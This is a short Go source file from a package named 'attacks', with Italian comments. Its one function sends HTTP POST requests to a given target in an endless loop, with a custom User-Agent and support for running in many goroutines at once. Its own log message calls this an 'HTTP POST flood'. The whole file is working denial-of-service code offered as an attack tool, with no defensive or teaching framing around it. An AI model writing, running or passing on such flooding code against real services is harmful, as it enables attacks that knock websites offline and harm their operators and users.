package attacks

import (
	"context"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"
)

// SendHTTPPost invia richieste HTTP POST in modo continuativo
func SendHTTPPost(target, body, userAgent string, wg *sync.WaitGroup, ctx context.Context) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for {
		select {
		case <-ctx.Done():
			log.Println("HTTP POST flood interrotto.")
			return
		default:
			req, err := http.NewRequest("POST", target, strings.NewReader(body))
			if err != nil {
				log.Printf("Error creating HTTP POST request: %v", err)
				continue
			}
			if userAgent != "" {
				req.Header.Set("User-Agent", userAgent)
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error in HTTP POST request: %v", err)
				continue
			}
			resp.Body.Close()

			log.Printf("POST request sent to %s, Status: %s\n", target, resp.Status)
		}
	}
}
